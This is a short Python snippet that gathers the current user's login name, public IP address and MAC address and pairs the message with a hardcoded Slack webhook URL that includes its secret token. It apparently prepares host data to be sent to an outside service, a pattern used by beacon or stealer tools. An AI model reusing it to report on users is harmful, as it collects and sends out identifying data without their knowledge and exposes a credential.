# Importing the os and requests modules.
import os
import requests

# Importing the get_mac_address function from the getmac module and renaming it to gma.
from getmac import get_mac_address as gma


def connection():
    """
    It returns a list containing the Slack webhook URL and a message containing the username, IP
    address, and MAC address of the user
    :return: A list of two items.
    """
    url = 'https://hooks.slack.com/services/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'
    msg = os.getlogin() + " / " + requests.get('https://api.ipify.org').text + " / " + gma()
    return ([url, msg])
